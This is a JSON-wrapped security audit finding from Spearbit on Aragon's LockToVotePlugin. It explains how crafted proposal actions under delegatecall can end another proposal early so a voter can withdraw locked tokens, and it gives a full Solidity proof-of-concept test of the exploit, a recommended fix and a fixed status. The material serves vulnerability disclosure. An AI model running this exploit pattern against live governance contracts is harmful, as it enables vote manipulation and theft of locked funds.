{
    "id": 62260,
    "kind": "PDF",
    "auditfirm_id": 6,
    "impact": "MEDIUM",
    "finders_count": 3,
    "protocol_id": 3395,
    "title": "Proposal's action should not be able to target the voting contract or the lock manager",
    "content": "## Severity: Medium Risk\n\n## Context\nLockToVotePlugin.sol#L121-L125\n\n## Description\nThe `LockToVotePlugin.createProposal` contract is not performing any sanity checks on the actions bound to the proposal that will be executed by the `IExecutor` contract once the proposal has passed and is executed.\n\nIf the plugin `_targetContract` is configured to execute the `execute` call with a low-level `delegatecall` (`Operation.DelegateCall`) and the actions are targeting the `LockManager`, those actions will be executed \"on behalf\" of the `LockToVotePlugin` and will be able to trigger the `proposalCreated` and `proposalEnded` functions even if the `LockToVotePlugin` is not \"actively\" invoking them because of a direct user's action.\n\nThis could allow the attacker to craft proposals that would:\n\n- **Spam the `proposalCreated` function**, adding \"fake\" proposal IDs to the `knownProposalIds` set and possibly DDoSing the lazy garbage collector logic performed by the `_withdrawActiveVotingPower` function during the unlock operation. Users won't be able to unlock and withdraw their tokens forever.\n- **Invoke the `proposalEnded`** even if the proposal has not been passed, executed, or even started. This would allow the attacker to cast a vote on a proposal, exploit the system by invoking `proposalEnded`, and unlock (and withdraw) their token without cleaning their vote.\n\n### Example Scenario\n- A \"normal\" `proposal_1` is created. The proposal ends in 1 year.\n- A \"crafted\" `proposal_2` is created. The actions of this proposal will invoke `LockManager.proposalEnded(proposal_1_id)`. This proposal ends in a tiny amount of time, but this is not relevant; with the existing codebase, we could early-execute them or even leverage the flashloan exploit already described during the review.\n\n1. Alice locks 100 tokens.\n2. Alice casts a \"NO\" vote to `proposal_1`.\n3. Alice casts a \"YES\" vote to `proposal_2`.\n4. `proposal_2` passes and is executed. One of the actions will invoke `LockManager.proposalEnded(proposal_1)`, removing `proposal_1` from the list of the `knownProposalIds` set.\n5. Alice can now call `LockManager.unlock` and will be able to unlock and withdraw her tokens even if in reality her vote is still registered in `proposal_1`.\n\n## Proof of Concept\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport {TestBase} from \"./lib/TestBase.sol\";\nimport {DaoBuilder} from \"./builders/DaoBuilder.sol\";\nimport {DAO, IDAO} from \"@aragon/osx/src/core/dao/DAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {createProxyAndCall} from \"../src/util/proxy.sol\";\nimport {LockToVotePlugin, MajorityVotingBase} from \"../src/LockToVotePlugin.sol\";\nimport {LockManagerSettings, PluginMode} from \"../src/interfaces/ILockManager.sol\";\nimport {IMajorityVoting} from \"../src/interfaces/IMajorityVoting.sol\";\nimport {LockManagerERC20} from \"../src/LockManagerERC20.sol\";\nimport {DaoUnauthorized} from \"@aragon/osx-commons-contracts/src/permission/auth/auth.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {TestToken} from \"./mocks/TestToken.sol\";\nimport {ILockToVote} from \"../src/interfaces/ILockToVote.sol\";\nimport {ILockToGovernBase} from \"../src/interfaces/ILockToGovernBase.sol\";\nimport {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport {IPlugin} from \"@aragon/osx-commons-contracts/src/plugin/IPlugin.sol\";\nimport {IMembership} from \"@aragon/osx-commons-contracts/src/plugin/extensions/membership/IMembership.sol\";\nimport {IERC165Upgradeable} from \"@openzeppelin/contracts-upgradeable/utils/introspection/ERC165Upgradeable.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {RATIO_BASE} from \"@aragon/osx-commons-contracts/src/utils/math/Ratio.sol\";\nimport {MinVotingPowerCondition} from \"../src/conditions/MinVotingPowerCondition.sol\";\n\ncontract Executor {\n    function execute(bytes32 _callId, Action[] calldata _actions, uint256 _allowFailureMap)\n        external\n        returns (bytes[] memory execResults, uint256 failureMap)\n    {\n        execResults = new bytes[](_actions.length);\n        for (uint256 i = 0; i < _actions.length;) {\n            (bool success, bytes memory result) = _actions[i].to.call(_actions[i].data);\n            execResults[i] = result;\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}\n\ncontract SVoteQuickTest is TestBase {\n    DaoBuilder builder;\n    DAO dao;\n    LockToVotePlugin ltvPlugin;\n    LockManagerERC20 lockManager;\n    IERC20 lockableToken;\n    uint256 proposalId;\n\n    function setUp() public {}\n\n    function _flashloan(address token, address user, uint256 amount) internal {\n        TestToken(token).mint(user, amount);\n    }\n\n    function _init(MajorityVotingBase.VotingMode _votingMode) internal {\n        builder = new DaoBuilder();\n        (dao, ltvPlugin, lockManager, lockableToken) =\n            builder.withVotingPlugin().withVotingMode(_votingMode).withProposer(alice).build();\n    }\n\n    function _vote(address user, uint256 propId, uint256 amount, IMajorityVoting.VoteOption vote) internal {\n        _flashloan(address(lockableToken), user, amount);\n        vm.startPrank(user);\n        lockableToken.approve(address(lockManager), amount);\n        lockManager.lockAndVote(propId, vote, amount);\n        vm.stopPrank();\n    }\n\n    function _vote(address user, uint256 propId, IMajorityVoting.VoteOption vote) internal {\n        vm.startPrank(user);\n        lockManager.vote(propId, vote);\n        vm.stopPrank();\n    }\n\n    function _lock(address user, uint256 amount) internal {\n        _flashloan(address(lockableToken), user, amount);\n        vm.startPrank(user);\n        lockableToken.approve(address(lockManager), amount);\n        lockManager.lock(amount);\n        vm.stopPrank();\n    }\n\n    function testExploitExecute() public {\n        _init(MajorityVotingBase.VotingMode.EarlyExecution);\n        \n        // grant THIS contract to modify the target config\n        dao.grant(address(ltvPlugin), address(this), ltvPlugin.SET_TARGET_CONFIG_PERMISSION_ID());\n        // grant lockManager to execute early proposals\n        dao.grant(address(ltvPlugin), address(lockManager), ltvPlugin.EXECUTE_PROPOSAL_PERMISSION_ID());\n        \n        // replace the target\n        Executor ex = new Executor();\n        IPlugin.TargetConfig memory targetConfig =\n            IPlugin.TargetConfig({target: address(ex), operation: IPlugin.Operation.DelegateCall});\n        ltvPlugin.setTargetConfig(targetConfig);\n        \n        // alice LOCK 100e18 tokens\n        _lock(alice, 100e18);\n        // generate the first proposal\n        vm.prank(alice);\n        uint256 proposalId_1 = ltvPlugin.createProposal(\"0x\", new Action[](0), 0, 0, abi.encode(uint256(0)));\n        \n        // alice vote NO to the first proposal\n        _vote(alice, proposalId_1, IMajorityVoting.VoteOption.No);\n        // 1 active proposal\n        vm.assertEq(lockManager.knownProposalIdsLength(), 1);\n        // expect revert, alice has VOTED on the first proposal that is still ONGOING\n        vm.prank(alice);\n        vm.expectRevert();\n        lockManager.unlock();\n        \n        // generate the data for the second proposal\n        bytes memory action_data = abi.encodeWithSignature(\"proposalEnded(uint256)\", proposalId_1);\n        Action[] memory actions_exploit = new Action[](1);\n        Action memory action_1 = Action(address(lockManager), 0, action_data);\n        actions_exploit[0] = action_1;\n        vm.prank(alice);\n        uint256 proposalId_2 = ltvPlugin.createProposal(\"0x\", actions_exploit, 0, 0, abi.encode(uint256(0)));\n        \n        assertEq(lockableToken.balanceOf(alice), 0);\n        // 2 active proposal\n        vm.assertEq(lockManager.knownProposalIdsLength(), 2);\n        // vote second proposal\n        _vote(alice, proposalId_2, IMajorityVoting.VoteOption.Yes);\n        \n        // all the proposals have been removed from the KNOWN one, even if\n        // proposal 1 is ACTIVE and ONGOING\n        vm.assertEq(lockManager.knownProposalIdsLength(), 0);\n        (bool proposal_1_open, bool proposal_1_executed,, MajorityVotingBase.Tally memory tally,,) =\n            ltvPlugin.getProposal(proposalId_1);\n        \n        vm.assertEq(proposal_1_open, true);\n        vm.assertEq(proposal_1_executed, false);\n        vm.assertEq(tally.no, 100e18);\n        \n        // alice can unlock the tokens and get back 100e18 even if the proposal1 is active\n        vm.prank(alice);\n        lockManager.unlock();\n        assertEq(lockableToken.balanceOf(alice), 100e18);\n    }\n\n    function _createProposalId(bytes32 _salt) internal view virtual returns (uint256) {\n        return uint256(keccak256(abi.encode(block.chainid, block.number, address(this), _salt)));\n    }\n}\n```\n\n## Recommendation\nAragon should prevent the creation of new proposals via `createProposal` when the action's target is `address(this)` (the `LockToVotePlugin` contract) or `lockManager` (the `LockManager` contract). Aragon could also consider reverting when `_targetConfig` is equal to `address(this)` or `lockManager`. Such a configuration would not make sense, and we already know that the execution will fail with those targets because none of them implements the `IExecutor.execute` function.\n\n```solidity\nfunction execute(\n    bytes32 _callId,\n    Action[] memory _actions,\n    uint256 _allowFailureMap\n) external returns (bytes[] memory, uint256);\n```\n\n## Status\n**Aragon:** Fixed in PR 29.\n\n**Spearbit:** Aragon has decided not to restrict the target of the action itself. The PR 29 has applied the following changes:\n- The executor of the proposal can't be the plugin itself or the lock manager.\n- The execution of the proposal can't be configured to use a delegatecall to execute the proposal.\n\nGiven that neither the `LockToVotePlugin` nor the `LockManager` exposes any function with the signature `function execute(bytes32 _callId, Action[] memory _actions, uint256 _allowFailureMap)`, we can consider the changes enough to solve the issue.\n\nAragon should keep this consideration in mind when they plan any future upgrade or change in the codebase.",
    "summary": "\nThe LockToVotePlugin contract is not properly checking for potential issues with proposals that are created and executed by the IExecutor contract. This could allow attackers to spam the proposalCreated function and potentially prevent users from unlocking their tokens. It could also allow attackers to prematurely end a proposal and withdraw their tokens without actually voting on it. A proof of concept has been provided to demonstrate this exploit. It is recommended that Aragon prevents the creation of proposals with the LockToVotePlugin or LockManager as the target, and considers reverting if the target is set to these contracts. This issue has been fixed in PR 29.",
    "report_date": "2025-08-28T00:00:00.000Z",
    "contest_prize_txt": "",
    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Aragon-Spearbit-Security-Review-July-2025.pdf",
    "sponsor_name": null,
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Aragon-Spearbit-Security-Review-July-2025.pdf",
    "github_link": "",
    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Aragon-Spearbit-Security-Review-July-2025.pdf",
    "pdf_page_from": 11,
    "contest_id": "",
    "slug": "proposals-action-should-not-be-able-to-target-the-voting-contract-or-the-lock-manager-spearbit-none-aragon-dao-gov-plugin-pdf",
    "firm_name": "Spearbit",
    "firm_logo_square": "spearbit_square.png",
    "protocol_name": "Aragon DAO Gov Plugin",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Om Parikh"
            }
        },
        {
            "wardens_warden": {
                "handle": "Emanuelle Ricci"
            }
        },
        {
            "wardens_warden": {
                "handle": "Patrick Drotleff"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
    },
    "protocols_protocol": {
        "name": "Aragon DAO Gov Plugin",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}